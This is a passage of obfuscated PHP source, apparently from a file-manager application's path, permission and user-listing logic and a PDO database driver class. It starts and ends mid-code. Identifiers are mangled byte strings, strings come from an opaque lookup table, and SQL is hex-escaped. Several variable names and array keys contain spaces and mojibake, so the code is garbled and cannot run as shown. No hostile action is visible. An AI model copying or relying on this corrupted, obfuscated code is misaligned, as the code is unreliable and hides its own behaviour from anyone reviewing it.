İ³™[$­º¬Ä‚[489]] && !$¨¢ÅÄ”§) { $ûŠ İ³™[$­º¬Ä‚[235]] = !1; $ûŠ İ³™[$­º¬Ä‚[234]] = !1; } } if ($ûŠ İ³™[$­º¬Ä‚[489]]) { $ûŠ İ³™[$­º¬Ä‚[235]] = AuthModel::authCheckEdit($ûŠ İ³™[$­º¬Ä‚[489]][$­º¬Ä‚[490]]); $ûŠ İ³™[$­º¬Ä‚[234]] = AuthModel::authCheckView($ûŠ İ³™[$­º¬Ä‚[489]][$­º¬Ä‚[490]]); } $this->groupPathDisplay($ûŠ İ³™); } unset($ûŠ İ³™); } public function _listAppendAuthSecret(&$àö“Î±Õ) { $ºßº†Ñ³ =& $_SERVER[¡¬ıÜ ƒ]; if (Model($ºßº†Ñ³[510])->get($ºßº†Ñ³[572]) != $ºßº†Ñ³[91]) { return; } static $Ø¸ÔÂµ = false; if (!$Ø¸ÔÂµ) { $ßÅã¨øØ = Model($ºßº†Ñ³[573]); $³ö×¿È = Model($ºßº†Ñ³[574]); $Ø¸ÔÂµ = $³ö×¿È->listData(); $Ø¸ÔÂµ = array_to_keyvalue($Ø¸ÔÂµ, $ºßº†Ñ³[193]); $È³Äùßë = json_decode(Model($ºßº†Ñ³[510])->get($ºßº†Ñ³[575]), !0); $È³Äùßë = array_to_keyvalue($È³Äùßë, $ºßº†Ñ³[477]); foreach ($Ø¸ÔÂµ as $ª°éç×ü => $¼™«‡Úä) { $ØÌ·õ‹Ş = $È³Äùßë[$¼™«‡Úä[$ºßº†Ñ³[576]]]; if (!$ØÌ·õ‹Ş) { $³ö×¿È->remove($¼™«‡Úä[$ºßº†Ñ³[477]]); unset($Ø¸ÔÂµ[$ª°éç×ü]); continue; } $Éø´› = $ßÅã¨øØ->listData($ØÌ·õ‹Ş[$ºßº†Ñ³[489]]); if (!$Éø´›) { $³ö×¿È->remove($¼™«‡Úä[$ºßº†Ñ³[477]]); unset($Ø¸ÔÂµ[$ª°éç×ü]); continue; } $¼™«‡Úä[$ºßº†Ñ³[489]] = $Éø´›; $¼™«‡Úä[$ºßº†Ñ³[577]] = $ØÌ·õ‹Ş; $¼™«‡Úä[$ºßº†Ñ³[578]] = Model($ºßº†Ñ³[579])->getInfoSimpleOuter($¼™«‡Úä[$ºßº†Ñ³[529]]); $Ø¸ÔÂµ[$ª°éç×ü] = $¼™«‡Úä; } } $„ìÍÕ»ú = USER_ID; $–‰­è†• = array(); $›ı™É…³ = $this->_listAppendPath($–‰­è†•, !0); foreach ($àö“Î±Õ as $ª°éç×ü => &$¼™«‡Úä) { if (!is_array($¼™«‡Úä[$ºßº†Ñ³[489]])) { continue; } if ($¼™«‡Úä[$ºßº†Ñ³[190]] != $ºßº†Ñ³[580]) { continue; } if (isset($Ø¸ÔÂµ[$¼™«‡Úä[$ºßº†Ñ³[193]]])) { $æòË·ª = $Ø¸ÔÂµ[$¼™«‡Úä[$ºßº†Ñ³[193]]]; if (!is_array($¼™«‡Úä[$ºßº†Ñ³[541]])) { $¼™«‡Úä[$ºßº†Ñ³[541]] = array(); } $¼™«‡Úä[$ºßº†Ñ³[541]][$ºßº†Ñ³[581]] = $æòË·ª[$ºßº†Ñ³[576]]; $¼™«‡Úä[$ºßº†Ñ³[489]][$ºßº†Ñ³[582]] = $æòË·ª; $¼™«‡Úä[$ºßº†Ñ³[489]][$ºßº†Ñ³[583]] = $¼™«‡Úä[$ºßº†Ñ³[584]]; $¼™«‡Úä[$ºßº†Ñ³[489]][$ºßº†Ñ³[585]] = $ºßº†Ñ³[91]; if ($æòË·ª[$ºßº†Ñ³[529]] != $„ìÍÕ»ú) { $¼™«‡Úä[$ºßº†Ñ³[489]][$ºßº†Ñ³[490]] = $¼™«‡Úä[$ºßº†Ñ³[489]][$ºßº†Ñ³[490]] & $æòË·ª[$ºßº†Ñ³[489]][$ºßº†Ñ³[489]]; } continue; } $¼Ø¸±›³ = $this->parentLevelArray($¼™«‡Úä[$ºßº†Ñ³[586]]); $·—îñÉŸ = array_reverse($¼Ø¸±›³); foreach ($·—îñÉŸ as $Ú„Ÿ¬—£ => $„úçÑ) { if (!isset($Ø¸ÔÂµ[$„úçÑ])) { continue; } $æòË·ª = $Ø¸ÔÂµ[$„úçÑ]; $¼™«‡Úä[$ºßº†Ñ³[489]][$ºßº†Ñ³[582]] = $æòË·ª; if ($æòË·ª[$ºßº†Ñ³[529]] != $„ìÍÕ»ú) { $¼™«‡Úä[$ºßº†Ñ³[489]][$ºßº†Ñ³[490]] = $¼™«‡Úä[$ºßº†Ñ³[489]][$ºßº†Ñ³[490]] & $æòË·ª[$ºßº†Ñ³[489]][$ºßº†Ñ³[489]]; } $¹âºĞü’ = $ºßº†Ñ³[12]; $·«ÖÁ² = count($¼Ø¸±›³) - $Ú„Ÿ¬—£; for ($•îŠÜôö = 0; $•îŠÜôö < $·«ÖÁ²; $•îŠÜôö++) { if (!isset($›ı™É…³[$¼Ø¸±›³[$•îŠÜôö]])) { $¹âºĞü’ = $ºßº†Ñ³[12]; break; } $¹âºĞü’ = $¹âºĞü’ . rtrim($›ı™É…³[$¼Ø¸±›³[$•îŠÜôö]], $ºßº†Ñ³[8]) . $ºßº†Ñ³[8]; } $¼™«‡Úä[$ºßº†Ñ³[489]][$ºßº†Ñ³[583]] = rtrim($¹âºĞü’, $ºßº†Ñ³[8]) . $ºßº†Ñ³[8]; break; } } unset($¼™«‡Úä); } public function groupPathDisplay(&$Å™¼¹‘Ò) { $üØ®ÂÖ =& $_SERVER[¡¬ıÜ ƒ]; if ($Å™¼¹‘Ò[$üØ®ÂÖ[190]] != self::TYPE_GROUP) { return; } $¸âó€… = Model($üØ®ÂÖ[587])->getInfo($Å™¼¹‘Ò[$üØ®ÂÖ[571]]); $®‰ñ÷İ¸ = $this->parentLevelArray($¸âó€…[$üØ®ÂÖ[586]]); $µ»ÜäÅ¹ = $üØ®ÂÖ[12]; foreach ($®‰ñ÷İ¸ as $×Ê‘©éå) { $ÈË»Ëã = Model($üØ®ÂÖ[587])->getInfo($×Ê‘©éå); $µ»ÜäÅ¹ .= $ÈË»Ëã[$üØ®ÂÖ[90]][$üØ®ÂÖ[193]] . $üØ®ÂÖ[50]; } $Å™¼¹‘Ò[$üØ®ÂÖ[588]] = $¸âó€…[$üØ®ÂÖ[192]]; $Å™¼¹‘Ò[$üØ®ÂÖ[589]] = $¸âó€…[$üØ®ÂÖ[586]]; $Å™¼¹‘Ò[$üØ®ÂÖ[590]] = $¸âó€…[$üØ®ÂÖ[591]]; $Å™¼¹‘Ò[$üØ®ÂÖ[592]] = $µ»ÜäÅ¹ . $¸âó€…[$üØ®ÂÖ[90]][$üØ®ÂÖ[193]]; } protected function _listAppendPath(&$ƒã£ÅÀä, $¬†Õ¶íé = false) { $óİ‰ñÓ¯ =& $_SERVER[¡¬ıÜ ƒ]; static $€×»›ƒ„ = array(); $¿¼Æî¥ = array(); $æ£¸ÑÃ = array(); if ($¬†Õ¶íé) { return $€×»›ƒ„; } foreach ($ƒã£ÅÀä as &$Ê–ƒ¼Œ’) { $şƒí™ = $Ê–ƒ¼Œ’[$óİ‰ñÓ¯[193]]; if ($Ê–ƒ¼Œ’[$óİ‰ñÓ¯[487]] == $óİ‰ñÓ¯[91] && $Ê–ƒ¼Œ’[$óİ‰ñÓ¯[192]] != 0) { $€×»›ƒ„[$şƒí™] = $Ê–ƒ¼Œ’[$óİ‰ñÓ¯[32]]; } if ($Ê–ƒ¼Œ’[$óİ‰ñÓ¯[487]] == $óİ‰ñÓ¯[91] && $Ê–ƒ¼Œ’[$óİ‰ñÓ¯[192]] == 0) { $€×»›ƒ„[$şƒí™] = $this->_listAppendPathRoot($Ê–ƒ¼Œ’, array()); } if (isset($æ£¸ÑÃ[$Ê–ƒ¼Œ’[$óİ‰ñÓ¯[586]]])) { continue; } $æ£¸ÑÃ[$Ê–ƒ¼Œ’[$óİ‰ñÓ¯[586]]] = !0; $ĞœÅ¨ÈÓ = $this->parentLevelArray($Ê–ƒ¼Œ’[$óİ‰ñÓ¯[586]]); foreach ($ĞœÅ¨ÈÓ as $±›Ø§‚ö => $½¥Öéí) { if (isset($€×»›ƒ„[$½¥Öéí])) { continue; } if ($±›Ø§‚ö == 0) { $€×»›ƒ„[$½¥Öéí] = $this->_listAppendPathRoot($Ê–ƒ¼Œ’, $ĞœÅ¨ÈÓ); } if ($±›Ø§‚ö != 0) { $¿¼Æî¥[] = $½¥Öéí; } } } unset($Ê–ƒ¼Œ’); $¿¼Æî¥ = array_unique($¿¼Æî¥); if (count($¿¼Æî¥) > 0) { $ô˜ù®§Ö = array($óİ‰ñÓ¯[493] => array($óİ‰ñÓ¯[494], $¿¼Æî¥)); if (count($¿¼Æî¥) == 1) { $›ŸêÖÀæ = $this->sourceInfo($¿¼Æî¥[0]); $Ê÷Š—œ” = is_array($›ŸêÖÀæ) ? array($›ŸêÖÀæ) : !1; } else { $Ê÷Š—œ” = $this->field($óİ‰ñÓ¯[593])->where($ô˜ù®§Ö)->select(); } if (!$Ê÷Š—œ”) { $Ê÷Š—œ” = array(); } foreach ($Ê÷Š—œ” as $ä¨êÄ©Î) { $€×»›ƒ„[$ä¨êÄ©Î[$óİ‰ñÓ¯[193]]] = $ä¨êÄ©Î[$óİ‰ñÓ¯[32]]; } } $ªĞ‘Ùò = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $·ïõó®È = array(); foreach ($ƒã£ÅÀä as &$Ê–ƒ¼Œ’) { $¡½ÛÌ³É = $Ê–ƒ¼Œ’[$óİ‰ñÓ¯[586]]; $‹ˆèÀ = $óİ‰ñÓ¯[12]; if (isset($·ïõó®È[$¡½ÛÌ³É])) { $‹ˆèÀ = $·ïõó®È[$¡½ÛÌ³É]; } else { $ĞœÅ¨ÈÓ = $this->parentLevelArray($Ê–ƒ¼Œ’[$óİ‰ñÓ¯[586]]); foreach ($ĞœÅ¨ÈÓ as $±›Ø§‚ö => $½¥Öéí) { if (isset($€×»›ƒ„[$½¥Öéí])) { $‹ˆèÀ .= $€×»›ƒ„[$½¥Öéí] . $óİ‰ñÓ¯[8]; } } $·ïõó®È[$¡½ÛÌ³É] = $‹ˆèÀ; } $‹ˆèÀ .= $Ê–ƒ¼Œ’[$óİ‰ñÓ¯[32]]; if ($Ê–ƒ¼Œ’[$óİ‰ñÓ¯[487]] == $óİ‰ñÓ¯[91]) { $‹ˆèÀ .= $óİ‰ñÓ¯[8]; } $Ê–ƒ¼Œ’[$óİ‰ñÓ¯[584]] = str_replace($óİ‰ñÓ¯[256], $óİ‰ñÓ¯[8], $‹ˆèÀ); if ($Ê–ƒ¼Œ’[$óİ‰ñÓ¯[192]] == $óİ‰ñÓ¯[230]) { $Ê–ƒ¼Œ’[$óİ‰ñÓ¯[32]] = trim($€×»›ƒ„[$Ê–ƒ¼Œ’[$óİ‰ñÓ¯[193]]], $óİ‰ñÓ¯[8]); $Ê–ƒ¼Œ’[$óİ‰ñÓ¯[584]] = $Ê–ƒ¼Œ’[$óİ‰ñÓ¯[32]] . $óİ‰ñÓ¯[8]; } if (intval($Ê–ƒ¼Œ’[$óİ‰ñÓ¯[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ê–ƒ¼Œ’, $ĞœÅ¨ÈÓ, $ªĞ‘Ùò); } } unset($Ê–ƒ¼Œ’); return $ƒã£ÅÀä; } private function _listAppendPathRecycle(&$¨¤“ØÃÈ, $¨ŸÉİ–ü, $ˆè¯õ‡ˆ) { $Ñéöƒ…Ù =& $_SERVER[¡¬ıÜ ƒ]; if (!in_array($ˆè¯õ‡ˆ, $¨ŸÉİ–ü) && $¨¤“ØÃÈ[$Ñéöƒ…Ù[193]] != $ˆè¯õ‡ˆ) { return; } $¨°§ã”˜ = explode($Ñéöƒ…Ù[8], trim($¨¤“ØÃÈ[$Ñéöƒ…Ù[584]], $Ñéöƒ…Ù[8])); $ª¾Âëõ™ = implode($Ñéöƒ…Ù[8], array_slice($¨°§ã”˜, 2)); $¨¤“ØÃÈ[$Ñéöƒ…Ù[584]] = $Ñéöƒ…Ù[8] . LNG($Ñéöƒ…Ù[594]) . $Ñéöƒ…Ù[8] . ltrim($ª¾Âëõ™, $Ñéöƒ…Ù[8]); $¨¤“ØÃÈ[$Ñéöƒ…Ù[586]] = $Ñéöƒ…Ù[595] . implode($Ñéöƒ…Ù[50], array_slice($¨ŸÉİ–ü, 1)) . $Ñéöƒ…Ù[50]; if ($¨¤“ØÃÈ[$Ñéöƒ…Ù[193]] == $ˆè¯õ‡ˆ) { $¨¤“ØÃÈ[$Ñéöƒ…Ù[586]] = $Ñéöƒ…Ù[595]; $¨¤“ØÃÈ[$Ñéöƒ…Ù[192]] = $Ñéöƒ…Ù[230]; $¨¤“ØÃÈ[$Ñéöƒ…Ù[32]] = LNG($Ñéöƒ…Ù[594]); } $¨¤“ØÃÈ[$Ñéöƒ…Ù[596]] = $Ñéöƒ…Ù[597]; } protected function _listAppendPathRoot(&$…Ä•õ·¿, $¡Çõ®ËŠ) { $¦³„œª =& $_SERVER[¡¬ıÜ ƒ]; static $Û™“Á¯Æ = false; static $õËãËŠˆ = false; $¸Å‘ìÑê = $¦³„œª[12]; if ($…Ä•õ·¿[$¦³„œª[190]] == self::TYPE_USER) { if ($…Ä•õ·¿[$¦³„œª[571]] == USER_ID) { $¸Å‘ìÑê = LNG($¦³„œª[598]); if ($Û™“Á¯Æ === !1) { $ğö¹ó¦ = Model($¦³„œª[599])->getInfoFull(USER_ID); $Û™“Á¯Æ = _get($ğö¹ó¦, $¦³„œª[600], $¦³„œª[12]); } if ($õËãËŠˆ === !1) { $ğö¹ó¦ = Model($¦³„œª[599])->getInfoFull(USER_ID); $õËãËŠˆ = _get($ğö¹ó¦, $¦³„œª[601], $¦³„œª[12]); } if ($¡Çõ®ËŠ && $¡Çõ®ËŠ[0] == $Û™“Á¯Æ || !$¡Çõ®ËŠ && $…Ä•õ·¿[$¦³„œª[193]] == $Û™“Á¯Æ) { $¸Å‘ìÑê = LNG($¦³„œª[602]); $…Ä•õ·¿[$¦³„œª[603]] = $¦³„œª[604]; } if ($¡Çõ®ËŠ && $¡Çõ®ËŠ[0] == $õËãËŠˆ || !$¡Çõ®ËŠ && $…Ä•õ·¿[$¦³„œª[193]] == $õËãËŠˆ) { $¸Å‘ìÑê = $¸Å‘ìÑê . $¦³„œª[605] . LNG($¦³„œª[606]); } if (!$¡Çõ®ËŠ) { $…Ä•õ·¿[$¦³„œª[32]] = $¸Å‘ìÑê; } } else { $ğö¹ó¦ = Model($¦³„œª[599])->getInfoFull($…Ä•õ·¿[$¦³„œª[571]]); $ÇùÓİïœ = _get($ğö¹ó¦, $¦³„œª[601], $¦³„œª[12]); $…Ä•õ·¿[$¦³„œª[607]] = Model($¦³„œª[579])->getInfoSimpleOuter($…Ä•õ·¿[$¦³„œª[571]]); $¸Å‘ìÑê = LNG($¦³„œª[608]) . $¦³„œª[176] . $…Ä•õ·¿[$¦³„œª[607]][$¦³„œª[32]] . $¦³„œª[178]; if ($¡Çõ®ËŠ && $¡Çõ®ËŠ[0] == $ÇùÓİïœ || !$¡Çõ®ËŠ && $…Ä•õ·¿[$¦³„œª[193]] == $ÇùÓİïœ) { $¸Å‘ìÑê = LNG($¦³„œª[608]) . $¦³„œª[609] . $…Ä•õ·¿[$¦³„œª[607]][$¦³„œª[32]] . $¦³„œª[605] . LNG($¦³„œª[606]) . $¦³„œª[178]; } } } else { if ($…Ä•õ·¿[$¦³„œª[190]] == self::TYPE_GROUP) { $Óêßõ• = Model($¦³„œª[587])->getInfoSimple($…Ä•õ·¿[$¦³„œª[571]]); $¸Å‘ìÑê = $Óêßõ•[$¦³„œª[32]]; } else { if ($…Ä•õ·¿[$¦³„œª[190]] == self::TYPE_SYSTEM) { $¸Å‘ìÑê = $¦³„œª[610]; } } } $¸Å‘ìÑê = $¸Å‘ìÑê ? $¦³„œª[8] . $¸Å‘ìÑê . $¦³„œª[8] : $¦³„œª[8]; return $¸Å‘ìÑê; } protected function _listAppendUser(&$üï±Åûş) { $ªßó° =& $_SERVER[¡¬ıÜ ƒ]; $à„²á¤” = array_to_keyvalue($üï±Åûş, $ªßó°[12], $ªßó°[529]); $Šˆ¢Ô´ = array_to_keyvalue($üï±Åûş, $ªßó°[12], $ªßó°[531]); $Ôõç± = array_merge($à„²á¤”, $Šˆ¢Ô´); $­—Õ‘Ö = Model($ªßó°[599])->userListInfo($Ôõç±); foreach ($üï±Åûş as &$•ÊÊ¥¼Ï) { $±¾€Êı = $•ÊÊ¥¼Ï[$ªßó°[529]]; $•ÊÊ¥¼Ï[$ªßó°[529]] = $­—Õ‘Ö[$±¾€Êı] ? $­—Õ‘Ö[$±¾€Êı] : !1; $±¾€Êı = $•ÊÊ¥¼Ï[$ªßó°[531]]; $•ÊÊ¥¼Ï[$ªßó°[531]] = $­—Õ‘Ö[$±¾€Êı] ? $­—Õ‘Ö[$±¾€Êı] : !1; if (_get($•ÊÊ¥¼Ï, $ªßó°[611], 0)) { $›À—Œœ = $GLOBALS[$ªßó°[6]][$ªßó°[92]][$ªßó°[612]]; if ($•ÊÊ¥¼Ï[$ªßó°[541]][$ªßó°[613]] <= time() - $›À—Œœ) { $this->metaSet($•ÊÊ¥¼Ï[$ªßó°[193]], $ªßó°[614], null); $this->metaSet($•ÊÊ¥¼Ï[$ªßó°[193]], $ªßó°[613], null); unset($•ÊÊ¥¼Ï[$ªßó°[541]][$ªßó°[614]]); continue; } $°¤Çˆ¸‡ = $•ÊÊ¥¼Ï[$ªßó°[541]][$ªßó°[614]]; $•ÊÊ¥¼Ï[$ªßó°[541]][$ªßó°[615]] = Model($ªßó°[599])->getInfoSimpleOuter($°¤Çˆ¸‡); } } unset($•ÊÊ¥¼Ï); } public function parentLevelArray($¬ÏàÙ) { $¼¹ŠõÆĞ =& $_SERVER[¡¬ıÜ ƒ]; $¬ÏàÙ = explode($¼¹ŠõÆĞ[50], trim($¬ÏàÙ, $¼¹ŠõÆĞ[50])); return array_remove_value($¬ÏàÙ, $¼¹ŠõÆĞ[230]); } public function listAll($ò³§Œ˜) { $Ş¼ğş¼ñ =& $_SERVER[¡¬ıÜ ƒ]; $À—İ¶ÕŠ = $this->sourceInfo($ò³§Œ˜); $€šˆéŒß = array($Ş¼ğş¼ñ[616] => array($Ş¼ğş¼ñ[617], $À—İ¶ÕŠ[$Ş¼ğş¼ñ[586]] . $ò³§Œ˜ . $Ş¼ğş¼ñ[618]), $Ş¼ğş¼ñ[619] => 0); $±øâÆ€” = $Ş¼ğş¼ñ[620]; $çû˜ò­” = "\x4c\x45\106\124\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\146\x69\x6c\145\x20\x66\151\x6c\145\40\x6f\x6e\40\x73\x6f\165\x72\x63\x65\x2e\x66\x69\154\145\111\104\x20\75\40\x66\x69\x6c\x65\x2e\146\151\154\145\x49\x44"; $Òâ‰‚ì = $this->alias($Ş¼ğş¼ñ[521])->field($±øâÆ€”)->where($€šˆéŒß)->join($çû˜ò­”)->select(); $this->_listAppendAuth($Òâ‰‚ì); $this->_listAppendUser($Òâ‰‚ì); $this->_listAppendPath($Òâ‰‚ì); $Òâ‰‚ì = array_to_keyvalue($Òâ‰‚ì, $Ş¼ğş¼ñ[193]); $ÓÉ‚¶à‰ = "\57{$À—İ¶ÕŠ[$Ş¼ğş¼ñ[32]]}\57"; $ÓÉ‚¶à‰ = $ÓÉ‚¶à‰ == $Ş¼ğş¼ñ[256] ? $Ş¼ğş¼ñ[8] : $ÓÉ‚¶à‰; $¸”Ôà«Š = array(); foreach ($Òâ‰‚ì as $øîùª‚¬ => $¥»¼¿Î’) { $ƒ‰ıÒÇ³ = $this->parentLevelArray($¥»¼¿Î’[$Ş¼ğş¼ñ[586]]); array_shift($ƒ‰ıÒÇ³); $í¤³êÊõ = $ÓÉ‚¶à‰; for ($Î¥¤‹à€ = 0; $Î¥¤‹à€ < count($ƒ‰ıÒÇ³); $Î¥¤‹à€++) { $í¤³êÊõ .= $Òâ‰‚ì[$ƒ‰ıÒÇ³[$Î¥¤‹à€]][$Ş¼ğş¼ñ[32]] . $Ş¼ğş¼ñ[8]; } $í¤³êÊõ .= $¥»¼¿Î’[$Ş¼ğş¼ñ[32]]; if ($¥»¼¿Î’[$Ş¼ğş¼ñ[487]]) { $í¤³êÊõ .= $Ş¼ğş¼ñ[8]; } $ù©±½ûÊ = array($Ş¼ğş¼ñ[497] => str_replace($Ş¼ğş¼ñ[256], $Ş¼ğş¼ñ[8], str_replace($Ş¼ğş¼ñ[256], $Ş¼ğş¼ñ[8], str_replace($Ş¼ğş¼ñ[256], $Ş¼ğş¼ñ[8], $í¤³êÊõ))), $Ş¼ğş¼ñ[621] => intval($¥»¼¿Î’[$Ş¼ğş¼ñ[487]]), $Ş¼ğş¼ñ[622] => intval($¥»¼¿Î’[$Ş¼ğş¼ñ[79]]), $Ş¼ğş¼ñ[88] => intval($¥»¼¿Î’[$Ş¼ğş¼ñ[88]]), $Ş¼ğş¼ñ[90] => $this->pathInfoFilter($¥»¼¿Î’)); if (!$ù©±½ûÊ[$Ş¼ğş¼ñ[487]]) { $ù©±½ûÊ[$Ş¼ğş¼ñ[543]] = $¥»¼¿Î’[$Ş¼ğş¼ñ[543]]; } $¸”Ôà«Š[] = $ù©±½ûÊ; } $¸”Ôà«Š = array_sort_by($¸”Ôà«Š, $Ş¼ğş¼ñ[87]); return $¸”Ôà«Š; } } goto bàõ©ö‰åã; AªéÚˆà×Ø: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($¼¾…È™ = '') { $¯Êò¿† =& $_SERVER[¡¬ıÜ ƒ]; if (!class_exists($¯Êò¿†[1002])) { think_exception(think_lang($¯Êò¿†[14]) . $¯Êò¿†[1003]); } if (!empty($¼¾…È™)) { $this->config = $¼¾…È™; if (empty($this->config[$¯Êò¿†[17]])) { $this->config[$¯Êò¿†[17]] = array(); } } } public function connect($ß«ÊšÎ  = '', $ƒîÖ‡ì‚ = 0) { $ÈÖ”ã‹ =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($this->linkID[$ƒîÖ‡ì‚])) { if (empty($ß«ÊšÎ )) { $ß«ÊšÎ  = $this->config; } $ñı÷î¿ = !empty($ß«ÊšÎ [$ÈÖ”ã‹[17]][$ÈÖ”ã‹[18]]) ? $ß«ÊšÎ [$ÈÖ”ã‹[17]][$ÈÖ”ã‹[18]] : $this->pconnect; if ($ñı÷î¿) { $ß«ÊšÎ [$ÈÖ”ã‹[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ƒîÖ‡ì‚] = new PDO($ß«ÊšÎ [$ÈÖ”ã‹[1004]], $ß«ÊšÎ [$ÈÖ”ã‹[976]], $ß«ÊšÎ [$ÈÖ”ã‹[977]], $ß«ÊšÎ [$ÈÖ”ã‹[17]]); } catch (PDOException $€Ûôş§€) { think_exception($€Ûôş§€->getMessage()); } $this->dbType = $this->_getDsnType($ß«ÊšÎ [$ÈÖ”ã‹[1004]]); if (in_array($this->dbType, array($ÈÖ”ã‹[1005], $ÈÖ”ã‹[1006], $ÈÖ”ã‹[1007], $ÈÖ”ã‹[1008]))) { think_exception($ÈÖ”ã‹[1009] . $this->dbType . $ÈÖ”ã‹[1010] . $this->dbType . $ÈÖ”ã‹[1011]); } if (!$this->linkID[$ƒîÖ‡ì‚]) { think_exception($ÈÖ”ã‹[1012]); } try { $this->linkID[$ƒîÖ‡ì‚]->exec($ÈÖ”ã‹[1013] . think_config($ÈÖ”ã‹[979])); } catch (Exception $€Ûôş§€) { } $this->connected = !0; if (1 != think_config($ÈÖ”ã‹[22])) { unset($this->config); } } return $this->linkID[$ƒîÖ‡ì‚]; } public function free() { $this->PDOStatement = null; } public function query($ŸÄéşëš, $±ˆŒÊÔò = array()) { $³Å—²²û =& $_SERVER[¡¬ıÜ ƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ŸÄéşëš; if (!empty($±ˆŒÊÔò)) { $this->queryStr .= $³Å—²²û[1014] . print_r($±ˆŒÊÔò, !0) . $³Å—²²û[1015]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($³Å—²²û[23], 1); think_status($³Å—²²û[24]); $this->PDOStatement = $this->_linkID->prepare($ŸÄéşëš); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $üğÄŞıü = $this->PDOStatement->execute($±ˆŒÊÔò); $this->debug(); if (!1 === $üğÄŞıü) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¤©¬ ÒÒ, $Ê¢ß²„ = array()) { $İƒçê¤¯ =& $_SERVER[¡¬ıÜ ƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¤©¬ ÒÒ; if (!empty($Ê¢ß²„)) { $this->queryStr .= $İƒçê¤¯[1014] . print_r($Ê¢ß²„, !0) . $İƒçê¤¯[1015]; } $ ÷ÒÚ = !1; if ($this->dbType == $İƒçê¤¯[1008]) { if (preg_match($İƒçê¤¯[1016], $this->queryStr, $Äùõú´€)) { $this->table = think_config($İƒçê¤¯[1017]) . str_ireplace(think_config($İƒçê¤¯[1018]), $İƒçê¤¯[456], $Äùõú´€[2]); $ ÷ÒÚ = (bool) $this->query($İƒçê¤¯[1019] . strtoupper($this->table) . $İƒçê¤¯[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($İƒçê¤¯[25], 1); think_status($İƒçê¤¯[24]); $this->PDOStatement = $this->_linkID->prepare($¤©¬ ÒÒ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $àƒ‹­…Ú = $this->PDOStatement->execute($Ê¢ß²„); $this->debug(); if (!1 === $àƒ‹­…Ú) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ ÷ÒÚ || preg_match($İƒçê¤¯[1020], $¤©¬ ÒÒ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $æÀ öÏË = $this->_linkID->commit(); $this->transTimes = 0; if (!$æÀ öÏË) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¨Œ‘ ±ù = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¨Œ‘ ±ù) { $this->error(); return !1; } } return !0; } private function getAll() { $æÚÇÙ‹ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($æÚÇÙ‹); return $æÚÇÙ‹; } public function getFields($µµ«œºú) { $İ¥Èó¡µ =& $_SERVER[¡¬ıÜ ƒ]; $this->initConnect(!0); if (think_config($İ¥Èó¡µ[1021])) { $¥Û”ïå… = str_replace($İ¥Èó¡µ[1022], $µµ«œºú, think_config($İ¥Èó¡µ[1021])); } else { switch ($this->dbType) { case $İ¥Èó¡µ[1005]: case $İ¥Èó¡µ[1023]: $¥Û”ïå… = "\x53\x45\x4c\105\x43\124\x20\40\x20\143\x6f\x6c\165\155\x6e\x5f\156\141\155\145\x20\141\163\40\47\116\x61\155\x65\x27\54\x20\x20\x20\144\141\x74\141\137\164\x79\x70\x65\40\x61\163\40\47\124\171\160\x65\x27\x2c\40\x20\x20\x63\157\x6c\165\x6d\x6e\137\144\145\x66\141\165\154\164\x20\x61\163\x20\x27\104\x65\x66\x61\165\154\x74\47\54\40\40\40\151\x73\x5f\156\165\154\154\x61\142\154\145\40\141\x73\x20\x27\x4e\165\154\x6c\x27\xa\11\x9\x46\122\x4f\x4d\11\151\x6e\x66\x6f\x72\155\141\164\x69\x6f\156\137\x73\143\x68\x65\155\141\56\164\141\x62\154\x65\163\x20\101\123\40\x74\12\11\11\112\117\111\116\11\x69\156\x66\157\162\155\141\x74\x69\x6f\x6e\x5f\163\x63\150\145\x6d\x61\x2e\x63\157\x6c\165\155\156\x73\40\x41\123\40\x63\12\11\11\117\x4e\x20\x20\x74\x2e\164\x61\x62\x6c\145\x5f\143\x61\164\141\154\157\x67\x20\x3d\40\143\x2e\164\141\142\x6c\145\x5f\x63\141\164\x61\154\157\147\xa\11\x9\x41\116\x44\40\164\x2e\164\141\x62\x6c\x65\137\163\x63\x68\x65\x6d\x61\x20\75\40\143\56\164\x61\x62\x6c\x65\x5f\x73\x63\x68\x65\x6d\x61\xa\11\11\101\x4e\104\x20\x74\56\164\x61\142\154\145\137\x6e\141\x6d\145\40\x3d\x20\143\x2e\164\x61\x62\x6c\145\x5f\x6e\x61\155\x65\12\x9\11\127\110\x45\122\105\40\40\40\x74\56\x74\x61\142\154\145\x5f\x6e\141\155\x65\x20\x3d\x20\x27{$µµ«œºú}\x27"; break; case $İ¥Èó¡µ[1024]: $¥Û”ïå… = $İ¥Èó¡µ[1025] . $µµ«œºú . $İ¥Èó¡µ[1026]; break; case $İ¥Èó¡µ[1006]: case $İ¥Èó¡µ[1008]: $¥Û”ïå… = $İ¥Èó¡µ[1027] . $İ¥Èó¡µ[1028] . $İ¥Èó¡µ[1029] . strtoupper($µµ«œºú) . $İ¥Èó¡µ[1030] . strtoupper($µµ«œºú) . $İ¥Èó¡µ[1031]; break; case $İ¥Èó¡µ[1032]: $¥Û”ïå… = $İ¥Èó¡µ[1033] . $µµ«œºú . $İ¥Èó¡µ[1034]; break; case $İ¥Èó¡µ[1007]: break; case $İ¥Èó¡µ[1035]: default: $¥Û”ïå… = $İ¥Èó¡µ[1036] . ($this->dbType == $İ¥Èó¡µ[1035] ? "\140{$µµ«œºú}\x60" : $µµ«œºú); } } $œáîœÌ¤ = $this->query($¥Û”ïå…); 